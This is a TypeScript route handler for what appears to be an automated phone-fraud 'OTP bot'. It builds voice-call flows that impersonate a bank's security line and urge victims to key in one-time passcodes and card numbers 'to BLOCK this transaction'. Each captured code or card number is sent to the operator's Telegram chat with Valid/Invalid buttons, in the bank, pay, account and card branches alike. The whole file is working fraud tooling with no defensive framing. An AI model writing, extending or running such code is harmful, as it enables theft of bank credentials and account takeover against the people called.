import { bot } from '../..';
import { app } from '../';
import { Markup } from 'telegraf';
import { v4 as uuidv4 } from 'uuid';

app.all('/calls/otp/:step/:chatId/:language', async (req, res) => {
  const { askCardInfo, cardType, variables, otpLength } = req.query;
  const { language, chatId, step } = req.params;

  const { dtmf } = JSON.parse(variables as string);

  if (dtmf && dtmf === '*') {
    await bot.telegram.sendMessage(chatId, `Kindly resend OTP NOW ❌`);

    return res.json({
      id: uuidv4(),
      title: `call ${step} - ${chatId} no OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload:
              'OKAY, KINDLY HOLD ON While we send YOU a new OTP CODE. WAIT!.  OKAY! We just sent you a new OTP CODE, Kindly input the OTP followed by the Pounds key.',
            language,
            voice: 'female',
          },
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'customStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: 'customStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}`,
          },
        },
      ],
    });
  }

  switch (step) {
    case 'bank':
      if (!dtmf) {
        return res.json({
          id: uuidv4(),
          title: `call ${step} - ${chatId} OTP`,
          record: false,
          steps: [
            {
              id: uuidv4(),
              action: 'say',
              options: {
                payload:
                  'You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.',
                language,
                voice: 'female',
                loop: true,
              },
              onKeypressGoto: 'nextStepOTP',
              endKey: '#',
              maxNumKeys: Number(otpLength),
              onKeypressVar: 'dtmf',
            },
            {
              id: uuidv4(),
              action: 'pause',
              options: {
                length: 5,
              },
              onKeypressGoto: 'nextStepOTP',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: Number(otpLength),
            },
            {
              id: 'nextStepOTP',
              action: 'fetchCallFlow',
              options: {
                url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}`,
              },
            },
          ],
        });
      }
      if (dtmf) {
        if (dtmf.length !== Number(otpLength)) {
          return res.json({
            id: uuidv4(),
            title: `call ${step} - ${chatId} OTP`,
            record: false,
            steps: [
              {
                id: uuidv4(),
                action: 'say',
                options: {
                  payload:
                    'The OTP you have entered is incorrect. Please enter the OTP again followed by the pound key.',
                  language,
                  voice: 'female',
                  loop: true,
                },
                onKeypressGoto: 'nextStepOTP',
                endKey: '#',
                maxNumKeys: Number(otpLength),
                onKeypressVar: 'dtmf',
              },
              {
                id: uuidv4(),
                action: 'pause',
                options: {
                  length: 5,
                },
                onKeypressGoto: 'nextStepOTP',
                onKeypressVar: 'dtmf',
                endKey: '#',
                maxNumKeys: Number(otpLength),
              },
              {
                id: 'nextStepOTP',
                action: 'fetchCallFlow',
                options: {
                  url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}&otpLength=${otpLength}`,
                },
              },
            ],
          });
        }
        await bot.telegram.sendMessage(
          req.params.chatId,
          `OTP is <b>${dtmf}</b> ✅`,
          {
            parse_mode: 'HTML',
            reply_markup: Markup.inlineKeyboard([
              Markup.button.callback('❤️ Valid', 'valid'),
              Markup.button.callback('💔 Invalid', 'invalid'),
            ]).reply_markup,
          },
        );
      }

      return res.json({
        id: uuidv4(),
        title: `call bank - ${chatId} OTP`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              payload: `GREAT. you have entered ${dtmf.split('').join(', ')}.`,
              language,
              voice: 'female',
            },
          },
          {
            id: uuidv4(),
            action: 'fetchCallFlow',
            options: {
              url: `${
                process.env.ENDPOINT_URL
              }/verify_input/${step}/${language}/${chatId}/${1}?otpLength=${otpLength}`,
            },
          },
        ],
      });

    case 'pay':
      if (!dtmf) {
        return res.json({
          id: uuidv4(),
          title: `call ${step} - ${chatId} OTP`,
          record: false,
          steps: [
            {
              id: uuidv4(),
              action: 'say',
              options: {
                payload:
                  'You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.',
                language,
                voice: 'female',
                loop: true,
              },
              onKeypressGoto: 'nextStepOTP',
              endKey: '#',
              maxNumKeys: Number(otpLength),
              onKeypressVar: 'dtmf',
            },
            {
              id: uuidv4(),
              action: 'pause',
              options: {
                length: 5,
              },
              onKeypressGoto: 'nextStepOTP',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: Number(otpLength),
            },
            {
              id: 'nextStepOTP',
              action: 'fetchCallFlow',
              options: {
                url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}`,
              },
            },
          ],
        });
      }
      if (dtmf) {
        if (dtmf.length !== Number(otpLength)) {
          return res.json({
            id: uuidv4(),
            title: `call ${step} - ${chatId} OTP`,
            record: false,
            steps: [
              {
                id: uuidv4(),
                action: 'say',
                options: {
                  payload:
                    'The OTP you have entered is incorrect. Please enter the OTP again followed by the pound key.',
                  language,
                  voice: 'female',
                  loop: true,
                },
                onKeypressGoto: 'nextStepOTP',
                endKey: '#',
                maxNumKeys: Number(otpLength),
                onKeypressVar: 'dtmf',
              },
              {
                id: uuidv4(),
                action: 'pause',
                options: {
                  length: 5,
                },
                onKeypressGoto: 'nextStepOTP',
                onKeypressVar: 'dtmf',
                endKey: '#',
                maxNumKeys: Number(otpLength),
              },
              {
                id: 'nextStepOTP',
                action: 'fetchCallFlow',
                options: {
                  url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}&otpLength=${otpLength}`,
                },
              },
            ],
          });
        }
        await bot.telegram.sendMessage(
          req.params.chatId,
          `OTP is <b>${dtmf}</b> ✅`,
          {
            parse_mode: 'HTML',
            reply_markup: Markup.inlineKeyboard([
              Markup.button.callback('❤️ Valid', 'valid'),
              Markup.button.callback('💔 Invalid', 'invalid'),
            ]).reply_markup,
          },
        );
      }
      return res.json({
        id: uuidv4(),
        title: `call bank - ${chatId} OTP`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              payload: `GREAT. you have entered ${dtmf.split('').join(', ')}.`,
              language,
              voice: 'female',
            },
          },
          {
            id: uuidv4(),
            action: 'fetchCallFlow',
            options: {
              url: `${
                process.env.ENDPOINT_URL
              }/verify_input/${step}/${language}/${chatId}/${1}?otpLength=${otpLength}`,
            },
          },
        ],
      });
    case 'account':
      if (!dtmf) {
        return res.json({
          id: uuidv4(),
          title: `call ${step} - ${chatId} OTP`,
          record: false,
          steps: [
            {
              id: uuidv4(),
              action: 'say',
              options: {
                payload:
                  'You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.',
                language,
                voice: 'female',
                loop: true,
              },
              onKeypressGoto: 'nextStepOTP',
              endKey: '#',
              maxNumKeys: Number(otpLength),
              onKeypressVar: 'dtmf',
            },
            {
              id: uuidv4(),
              action: 'pause',
              options: {
                length: 5,
              },
              onKeypressGoto: 'nextStepOTP',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: Number(otpLength),
            },
            {
              id: 'nextStepOTP',
              action: 'fetchCallFlow',
              options: {
                url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}`,
              },
            },
          ],
        });
      }
      if (dtmf) {
        if (dtmf.length !== Number(otpLength)) {
          return res.json({
            id: uuidv4(),
            title: `call ${step} - ${chatId} OTP`,
            record: false,
            steps: [
              {
                id: uuidv4(),
                action: 'say',
                options: {
                  payload:
                    'The OTP you have entered is incorrect. Please enter the OTP again followed by the pound key.',
                  language,
                  voice: 'female',
                  loop: true,
                },
                onKeypressGoto: 'nextStepOTP',
                endKey: '#',
                maxNumKeys: Number(otpLength),
                onKeypressVar: 'dtmf',
              },
              {
                id: uuidv4(),
                action: 'pause',
                options: {
                  length: 5,
                },
                onKeypressGoto: 'nextStepOTP',
                onKeypressVar: 'dtmf',
                endKey: '#',
                maxNumKeys: Number(otpLength),
              },
              {
                id: 'nextStepOTP',
                action: 'fetchCallFlow',
                options: {
                  url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}&otpLength=${otpLength}`,
                },
              },
            ],
          });
        }
        await bot.telegram.sendMessage(
          req.params.chatId,
          `OTP is <b>${dtmf}</b> ✅`,
          {
            parse_mode: 'HTML',
            reply_markup: Markup.inlineKeyboard([
              Markup.button.callback('❤️ Valid', 'valid'),
              Markup.button.callback('💔 Invalid', 'invalid'),
            ]).reply_markup,
          },
        );
      }
      return res.json({
        id: uuidv4(),
        title: `call bank - ${chatId} OTP`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              payload: `GREAT. you have entered ${dtmf.split('').join(', ')}.`,
              language,
              voice: 'female',
            },
          },
          {
            id: uuidv4(),
            action: 'fetchCallFlow',
            options: {
              url: `${
                process.env.ENDPOINT_URL
              }/verify_input/${step}/${language}/${chatId}/${1}?askCardInfo=${askCardInfo}&cardType=${cardType}?otpLength=${otpLength}`,
            },
          },
        ],
      });

    case 'card':
      if (!dtmf) {
        return res.json({
          id: uuidv4(),
          title: `call ${step} - ${chatId} CARD`,
          record: false,
          steps: [
            {
              id: uuidv4(),
              action: 'say',
              options: {
                payload: `You have not entered anything. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound keyYou have not entered anything. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key.`,
                language,
                voice: 'female',
                loop: true,
              },
              onKeypressGoto: 'nextStepCard',
              endKey: '#',
              maxNumKeys: 18,
              onKeypressVar: 'dtmf',
            },
            {
              id: uuidv4(),
              action: 'pause',
              options: {
                length: 5,
              },
              onKeypressGoto: 'nextStepCard',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: 18,
            },
            {
              id: 'nextStepCard',
              action: 'fetchCallFlow',
              options: {
                url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}&otpLength=${otpLength}`,
              },
            },
          ],
        });
      }
      if (!(dtmf.length > 14 && dtmf.length < 17)) {
        return res.json({
          id: uuidv4(),
          title: `call ${step} - ${chatId} CARD`,
          record: false,
          steps: [
            {
              id: uuidv4(),
              action: 'say',
              options: {
                payload: `The card number you have entered is incorrect. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key.`,
                language,
                voice: 'female',
                loop: true,
              },
              onKeypressGoto: 'nextStepCard',
              endKey: '#',
              maxNumKeys: 18,
              onKeypressVar: 'dtmf',
            },
            {
              id: uuidv4(),
              action: 'pause',
              options: {
                length: 5,
              },
              onKeypressGoto: 'nextStepCard',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: 18,
            },
            {
              id: 'nextStepCard',
              action: 'fetchCallFlow',
              options: {
                url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}&otpLength=${otpLength}`,
              },
            },
          ],
        });
      }
      if (dtmf) {
        await bot.telegram.sendMessage(
          req.params.chatId,
          `Card number <b>${dtmf}</b> ✅`,
          {
            parse_mode: 'HTML',
          },
        );
        return res.json({
          id: uuidv4(),
          title: `call ${step} - ${chatId} CARD`,
          record: false,
          steps: [
            {
              id: uuidv4(),
              action: 'say',
              options: {
                payload: `GREAT, you have entered ${dtmf
                  .split('')
                  .join(
                    ', ',
                  )}. Please enter your ${cardType} card expiration date followed by the pound key.`,
                language,
                voice: 'female',
                loop: true,
              },
              onKeypressGoto: 'nextStepCard',
              endKey: '#',
              maxNumKeys: 18,
              onKeypressVar: 'dtmf',
            },
            {
              id: uuidv4(),
              action: 'pause',
              options: {
                length: 5,
              },
              onKeypressGoto: 'nextStepCard',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: 18,
            },
            {
              id: 'nextStepCard',
              action: 'fetchCallFlow',
              options: {
                url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&expiry=yes`,
              },
            },
          ],
        });
      } else {
        return res.json({
          id: uuidv4(),
          title: `call ${step} - ${chatId} CARD`,
          record: false,
          steps: [
            {
              id: uuidv4(),
              action: 'say',
              options: {
                payload: `You have not entered anything. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key.`,
                language,
                voice: 'female',
                loop: true,
              },
              onKeypressGoto: 'nextStepCard',
              endKey: '#',
              maxNumKeys: 18,
              onKeypressVar: 'dtmf',
            },
            {
              id: uuidv4(),
              action: 'pause',
              options: {
                length: 5,
              },
              onKeypressGoto: 'nextStepCard',
              onKeypressVar: 'dtmf',
              endKey: '#',
              maxNumKeys: 18,
            },
            {
              id: 'nextStepCard',
              action: 'fetchCallFlow',
              options: {
                url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}&otpLength=${otpLength}`,
              },
            },
          ],
        });
      }
    default:
      break;
  }
});
